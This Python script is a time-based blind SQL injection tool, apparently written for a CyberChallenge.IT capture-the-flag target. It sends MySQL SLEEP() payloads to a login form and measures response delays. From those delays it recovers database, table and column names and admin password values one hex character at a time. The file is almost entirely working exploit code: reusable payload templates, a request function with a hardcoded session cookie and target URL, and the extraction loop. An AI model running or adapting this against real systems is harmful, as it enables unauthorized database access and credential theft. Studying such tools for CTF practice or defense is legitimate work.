import requests, time
from typing import Callable
__all__ = 'deep_time_search'.split()

try:
  from deep_error_search import pretty_print_hex_list
except ModuleNotFoundError:
  from search.deep_error_search import pretty_print_hex_list


def _search(send_request: Callable, d_time: float, value:str) -> list[str]:
  s = []
  for l in '0123456789abcdef':
    t = time.time()
    send_request(value+l)
    t = time.time() - t
    if t > d_time * .95:
      s.append(value+l)
  return s


def deep_time_search(send_request: Callable, d_time: float, starting_value='') -> list[str]:

  # convert starting_value in hexadecimal form
  starting_value = ''.join([hex(ord(i))[2:] for i in starting_value])

  timer = time.time()

  results = []
  broken = []
  no_repetition = [starting_value]
  out = [starting_value]
  while len(out) > 0:
    pretty_print_hex_list('out:', out)
    pretty_print_hex_list('results:', results)
    current = out.pop()
    res = _search(send_request, d_time, current)
    if res == []:
      try:
        print('RESULT:', bytes.fromhex(current))
        results.append(current)
      except:
        print('BROKEN:', current, bytes.fromhex(current[:-1]))
        broken.append(current[:-1])
    for i in res:
      if i not in no_repetition:
        out.append(i)
        no_repetition.append(i)

  # print('no_repetition', no_repetition)
  # pretty_print_hex_list('out', out)

  timer = time.time() - timer
  print("deep execution time:", timer)

  pretty_print_hex_list('BROKEN:', broken)
  return pretty_print_hex_list('RESULTS:', results)
      



if __name__ == '__main__':

  # db
  QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.schemata WHERE HEX(schema_name) LIKE '{}%') -- "
  # table
  # QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.tables WHERE HEX(table_name) LIKE '{}%' AND table_schema = DATABASE()) -- "
  # column
  # QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.columns WHERE HEX(column_name) LIKE '{}%' AND table_name = 'Users') -- "
  # value
  # QUERY = "' AND (SELECT SLEEP({}) FROM Users WHERE HEX(pwd) LIKE '{}%' AND isAdmin=1) -- "
  # QUERY = ""
  TIME = .4


  def send_request(value:str):
    url = "http://onbusinessdev.challs.cyberchallenge.it:80/login.php"
    cookies = {"OBDEV_SESSID": "594e7f4c495e7bbedc9a166d7555c1f6"}
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://onbusinessdev.challs.cyberchallenge.it", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://onbusinessdev.challs.cyberchallenge.it/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    data = {
      "email": QUERY.format(TIME, value),
      "password": "1"
    }
    requests.post(url, headers=headers, cookies=cookies, data=data)


  print(deep_time_search(send_request, TIME, ''))